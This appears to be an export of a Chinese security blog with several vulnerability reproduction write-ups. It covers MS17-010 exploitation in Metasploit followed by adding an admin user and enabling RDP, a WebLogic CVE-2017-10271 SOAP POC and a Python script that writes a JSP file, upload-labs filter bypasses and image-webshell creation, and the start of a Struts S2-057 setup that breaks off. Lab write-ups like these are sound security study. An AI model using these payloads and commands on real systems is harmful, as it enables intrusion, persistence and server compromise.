192.168.159.133</code></p><p>执行<br><code>run</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173247.png" alt></p><h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><p>使用模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>查看选项<br><code>shwo options</code></p><p>执行<br><code>exploit</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173713.png" alt></p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807174031.png" alt></p><h2 id="控制提权"><a href="#控制提权" class="headerlink" title="控制提权"></a>控制提权</h2><p>windows shell 下执行：<br>新建用户<br><code>net user dylan 123456 /add</code></p><p>添加管理组<br><code>net localgroup administrators dylan /add</code></p><p>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p>kali 登陆远程桌面：<br><code>rdesktop 192.168.159.133:3389</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807175105.png" alt></p><hr><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><ul><li>在线更新：开启Windows Update更新。</li><li>打补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener">点击下载</a></li></ul><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/193681.html" target="_blank" rel="noopener">永恒之蓝漏洞复现(ms17-010)</a><br><a href="https://blog.51cto.com/chenxinjie/2092754?from=timeline" target="_blank" rel="noopener">MS17-010 基于”永恒之蓝”实现Windows Getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 永恒之蓝漏洞 </tag>
            
            <tag> ms17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic WLS组件漏洞复现</title>
      <link href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/"/>
      <url>/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>漏洞编号：CVE-2017-10271</p><p>漏洞描述：<br>Weblogic的WLS Security组件对外提供webservice服务，<br>其中使用了XMLDecoder来解析用户传入的XML数据，<br>在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>受影响WebLogic版本：</p><ul><li>10.3.6.0.0</li><li>12.1.3.0.0</li><li>12.2.1.1.0</li><li>12.2.1.2.0</li></ul><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10 1903 x64<br>靶   机：Windows server 2008 R2 x64</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>安装<code>jdk1.8.0_191</code>（路径不要带有空格）,并配置环境变量<br>安装 <a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html" target="_blank" rel="noopener">WebLogic Server 10.3.6</a><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806171919.png" alt><br>详细安装过程参考：<a href="https://wenku.baidu.com/view/938a7a56f5335a8102d220d0.html" target="_blank" rel="noopener">webLogic10.3.6安装、配置图解</a></p><p>输入配置管理员用户名和口令时设置的用户名和口令之后，<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172423.png" alt></p><p>使用攻击机访问  <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>如出现如下界面，则搭建成功<br><strong>（注意：要把靶机上的防火墙关闭）</strong><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172734.png" alt></p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>&lt;soapenv:Envelope     xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;    &lt;soapenv:Header&gt;       &lt;work:WorkContext    xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;           &lt;java      version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;               &lt;void     class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array    class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void     index=&quot;0&quot;&gt;                           &lt;string&gt;calc&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;1&quot;&gt;                            &lt;string&gt;&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;2&quot;&gt;                            &lt;string&gt; &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void     method=&quot;start&quot;/&gt;&lt;/void&gt;           &lt;/java&gt;       &lt;/work:WorkContext&gt;   &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;</code></pre><p>攻击机访问 <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>使用Burp Suite抓包，发送到Repeater<br>使用post方法发送下方POC，并添加Content-Type:text/xml，把Cache-Control修改为no-cache<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173735.png" alt></p><p>返回状态码 500，进入靶机查看，弹出计算机，执行calc命令成功</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173856.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806174012.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#! -*- coding:utf-8 -*-import requestsurl = &quot;http://192.168.159.138:7001/wls-wsat/CoordinatorPortType&quot;xml = &#39;&#39;&#39;     &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;     &lt;![CDATA[ &lt;% out.print(&quot;test&quot;); %&gt;     ]]&gt;     &lt;/string&gt;     &lt;/void&gt;     &lt;void method=&quot;close&quot;/&gt;     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;     &lt;/work:WorkContext&gt;     &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;&#39;&#39;&#39;r =requests.post(url,headers={&#39;Content-Type&#39;:&#39;text/xml&#39;,&#39;Cache-Control&#39;:&#39;no-cache&#39;},data=xml)print r.status_codeprint r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直接运行 <code>python2 CVE-2017-10271.py</code> 写入一句话</p><p>访问shell<br><code>http://靶机ip:7001/bea_wls_internal/test.jsp</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806190652.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/158247.html" target="_blank" rel="noopener">WebLogic WLS组件漏洞复现</a><br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WebLogic WLS </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传漏洞练习</title>
      <link href="/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/"/>
      <url>/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>最近在研究文件上传漏洞，找到一个很好的靶场——<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>，<br>一个想帮你总结所有类型的上传漏洞的靶场 ，可以用docker快速搭建，闯关的过程中遇到很多问题，受益匪浅。</p><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>使用docker快速搭建，docker的安装这里不再赘述。</p><p><code>docker pull c0ny1/upload-labs</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804145816.png" alt></p><p>创建容器<br><code>docker run -d -p 8000:80 c0ny1/upload-labs:latest</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150235.png" alt></p><p>本地环境，访问<code>127.0.0.1:8000</code><br>云服务器上搭建的，访问<code>服务器ip:8000</code>（注意开放防火墙端口，阿里云服务器需要在云控制台配置开放端口）</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150626.png" alt></p><hr><h1 id="0x03-闯关"><a href="#0x03-闯关" class="headerlink" title="0x03 闯关"></a>0x03 闯关</h1><h2 id="Pass-01（前端）"><a href="#Pass-01（前端）" class="headerlink" title="Pass-01（前端）"></a>Pass-01（前端）</h2><p>这一关是在客户端使用js对不合法图片进行检查，直接F12，把调用相关js的代码删掉，直接上传拿shell</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151107.png" alt></p><h2 id="Pass-02（MIME）"><a href="#Pass-02（MIME）" class="headerlink" title="Pass-02（MIME）"></a>Pass-02（MIME）</h2><p>第二关主要是检查MIME，直接抓包修改Content-Type（例如：<code>image/gif</code>）上传即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151431.png" alt></p><h2 id="Pass-03（特殊可解析后缀）"><a href="#Pass-03（特殊可解析后缀）" class="headerlink" title="Pass-03（特殊可解析后缀）"></a>Pass-03（特殊可解析后缀）</h2><p>第三关是黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件，尝试另类文件名绕过。（phtml，php3，php4, php5, pht等）<br>直接抓包修改文件后缀，将php改为phtml，php3，php4, php5, pht等，上传成功<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804152622.png" alt></p><p>但是很鸡肋，如果服务器没有配置别名解析，上传上去是无法被解析执行的。<br>如果无法解析执行，需要修改apache配置文件。<br>这里以docker搭建的环境为例：<br>输入命令进入容器内部：</p><pre><code>docker exec -it condescending_nightingale /bin/bash # 这里的condescending_nightingale是容器的name，可以输入docker ps查看</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804153104.png" alt></p><pre><code>vim /etc/apache2/apache2.conf</code></pre><p>修改apache2配置文件，添加下面这句话<br><code>AddType application/x-httpd-php .php .phtml .phps .php3 .php5 .pht</code></p><p>退出容器内部<br><code>exit</code></p><p>重启容器，即可解析成功<br><code>docker restart condescending_nightingale</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804154224.png" alt></p><h2 id="Pass-04（htaccess）"><a href="#Pass-04（htaccess）" class="headerlink" title="Pass-04（htaccess）"></a>Pass-04（htaccess）</h2><p>这一关过滤了各种罕见后缀，但是没有过滤<code>.htaccess</code>文件<br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>启用.htaccess，需要修改<code>apache2.conf</code><strong>(同Pass-03)</strong>，启用AllowOverride.</p><p><code>AllowOverride None</code><br>改为<br><code>AllowOverride All</code></p><p>如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。<br>例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：</p><p><code>AccessFileName .config</code> </p><p>然后执行命令启用Mod_rewrite模块</p><p><code>sudo a2enmod rewrite</code></p><p>最后重启apache2</p><p><code>service apache2 restart</code></p><p>使用 快捷键<code>ctrl + p + q</code>退出容器（不会中止容器）</p><p>先上传<code>.htaccess</code>文件，文件内容如下(引号内替换成你要上传执行的文件名)：</p><pre><code>    &lt;FilesMatch &quot;cmd.jpeg&quot;&gt;      SetHandler application/x-httpd-php    &lt;/FilesMatch&gt;</code></pre><p>windows系统文件不能命名为<code>.*</code>，所以在上传的时候抓包，改文件名，删掉点前面的</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804215949.png" alt></p><p>然后上传图片木马文件  <code>cmd.jpeg</code> ，成功解析。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804220610.png" alt></p><h2 id="Pass-05（大小写）"><a href="#Pass-05（大小写）" class="headerlink" title="Pass-05（大小写）"></a>Pass-05（大小写）</h2><p>这一关把<code>.htaccess</code>后缀也禁止了，查看源代码，发现把转换成小写的代码去掉了</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>因此我们可以上传Php、phP之类的来绕过黑名单后缀，成功上传。<br>(在Linux没有特殊配置的情况下，这种情况只有win可以解析执行，因为win会忽略大小写)</p><h2 id="Pass-06（空格）"><a href="#Pass-06（空格）" class="headerlink" title="Pass-06（空格）"></a>Pass-06（空格）</h2><p>这一关，少了这一段代码<br><code>$file_ext = trim($file_ext); //首尾去空</code></p><p>可以进行空格绕过，直接抓包修改文件名，再文件名末尾添加空格，成功上传</p><h2 id="Pass-07（点）"><a href="#Pass-07（点）" class="headerlink" title="Pass-07（点）"></a>Pass-07（点）</h2><p>这一关少了这段代码</p><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p><h2 id="Pass-08（-DATA）"><a href="#Pass-08（-DATA）" class="headerlink" title="Pass-08（::$DATA）"></a>Pass-08（::$DATA）</h2><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code><br>NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。<br>备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传.php::$DATA绕过。(仅限windows)</p><h2 id="Pass-09-代码审计"><a href="#Pass-09-代码审计" class="headerlink" title="Pass-09(代码审计)"></a>Pass-09(代码审计)</h2><pre><code>        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</code></pre><p>查看源码，这里只过滤了一次，所以直接构造 <code>.php. .</code> 绕过</p><h2 id="Pass-10-双写"><a href="#Pass-10-双写" class="headerlink" title="Pass-10(双写)"></a>Pass-10(双写)</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>这里是将黑名单里的后缀替换为空，可以利用双写绕过<br>构造<code>.pphpph</code>,成功上传解析执行。</p><h2 id="Pass-11（-00截断）"><a href="#Pass-11（-00截断）" class="headerlink" title="Pass-11（%00截断）"></a>Pass-11（%00截断）</h2><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>可以参考这篇文章：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p><p><code>save_path</code> 是一个可控的变量，可以使用%00截断<br>使用条件：</p><ul><li>php 版本&lt;5.3.4 才有可能存在此漏洞</li><li>php的magic_quotes_gpc为OFF状态</li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805093837.png" alt></p><h2 id="Pass-12（0x00截断）"><a href="#Pass-12（0x00截断）" class="headerlink" title="Pass-12（0x00截断）"></a>Pass-12（0x00截断）</h2><p>原理同Pass-11,只不过<code>save_path</code>是通过post传进来的，需要在Hex里修改</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100157.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805095929.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100023.png" alt></p><p><code>+</code>的URL编码的16进制 为2b，将2b改为00即可</p><h2 id="Pass-13（文件头）"><a href="#Pass-13（文件头）" class="headerlink" title="Pass-13（文件头）"></a>Pass-13（文件头）</h2><p>这一关通过读文件的前2个字节判断文件类型<br>直接使用 cmd命令生成图片木马上传</p><p><code>copy pikachu.gif /b + cmd.php /a cmd.gif</code></p><p>用给出的文件包含漏洞页面来测试图片马是否能正常运行！<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103257.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103451.png" alt></p><h2 id="Pass-14（getimagesize）"><a href="#Pass-14（getimagesize）" class="headerlink" title="Pass-14（getimagesize）"></a>Pass-14（getimagesize）</h2><p>这一关使用<code>getimagesize</code>获取文件类型，直接就可以利用图片马进行绕过。（同Pass-13）</p><h2 id="Pass-15（exif-imagetype-）"><a href="#Pass-15（exif-imagetype-）" class="headerlink" title="Pass-15（exif_imagetype()）"></a>Pass-15（exif_imagetype()）</h2><p>本关使用<code>exif_imagetype()</code>检查是否为图片文件,直接就可以利用图片马就可进行绕过。</p><h2 id="Pass-16（二次渲染）"><a href="#Pass-16（二次渲染）" class="headerlink" title="Pass-16（二次渲染）"></a>Pass-16（二次渲染）</h2><p>本关判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染<br>具体可以参考这篇文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p><p>先上传图片码，然后下载下来，用16进制编辑器打开，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，<br>将Webshell代码插在该部分，然后上传即可<br>jpg和png很麻烦，gif直接修改没有改变的区域即可。</p><h2 id="Pass-17（条件竞争）"><a href="#Pass-17（条件竞争）" class="headerlink" title="Pass-17（条件竞争）"></a>Pass-17（条件竞争）</h2><p>本关文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除。<br>此时可以利用条件竞争在保存文件后删除文件前来执行php文件。<br>可以用burp suite中的Intruder模块同时批量上传、访问webshell，<br>将payloads中的payload type设置为Null payload，<br>Generate payload次数多点。</p><h2 id="Pass-18（条件竞争）"><a href="#Pass-18（条件竞争）" class="headerlink" title="Pass-18（条件竞争）"></a>Pass-18（条件竞争）</h2><p>和Pass-17一样，也是一个条件竞争的问题，查看源代码<br>对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名等。<br>可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p><h2 id="Pass-19（代码审计）"><a href="#Pass-19（代码审计）" class="headerlink" title="Pass-19（代码审计）"></a>Pass-19（代码审计）</h2><pre><code>$img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) {                 $is_upload = true;            }else{                $msg = &#39;上传失败！&#39;;            }</code></pre><p><code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，因此可以在<code>save_name</code>利用00截断绕过。</p><p>另外<strong><code>move_uploaded_file</code></strong>会忽略掉文件末尾的 <code>/.</code><br>所以可以构造 <code>cmd.php/.</code> 来绕过<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805121815.png" alt></p><h2 id="Pass-20（代码审计）"><a href="#Pass-20（代码审计）" class="headerlink" title="Pass-20（代码审计）"></a>Pass-20（代码审计）</h2><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><pre><code>if (!is_array($file)) {                    $file = explode(&#39;.&#39;, strtolower($file));                }</code></pre><pre><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></pre><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，<br>第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，<br>根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将/.忽略，因此还是可以上传成功的。<br>因此<code>save_name</code>变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805123452.png" alt></p><hr><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><h2 id="upload-labs总结"><a href="#upload-labs总结" class="headerlink" title="upload-labs总结"></a>upload-labs总结</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134449.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134922.png" alt></p><p>其中有一些漏洞因为环境原因，没能成功解析执行。<br>顺便在总结一下其他中间件问题导致的解析漏洞</p><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><p>IIS 6.0解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><pre><code>/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx</code></pre><h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php，可以解析为php</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4029" target="_blank" rel="noopener">Upload-labs 20关通关笔记</a><br><a href="https://blog.csdn.net/u011377996/article/details/86776198" target="_blank" rel="noopener">upload-labs刷关记录</a><br><a href="http://poetichacker.com/writeup/从upload-labs总结上传漏洞及其绕过.html" target="_blank" rel="noopener">从upload-labs总结上传漏洞及其绕过 </a><br><a href="https://www.smi1e.top/文件解析漏洞总结/" target="_blank" rel="noopener">文件解析漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> dcoker </tag>
            
            <tag> upload-labs </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11776漏洞复现</title>
      <link href="/2019/08/02/cve-2018-11776-lou-dong-fu-xian/"/>
      <url>/2019/08/02/cve-2018-11776-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p><p>Apache struts 2.5-Apache struts 2.5.16 </p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>windows 10</li><li>jdk1.8.0_191</li><li>apache-tomcat-7.0.96</li><li>struts-2.3.34</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p><p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p><p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p><p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p><p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p><p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p><ul><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li></ul><p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; 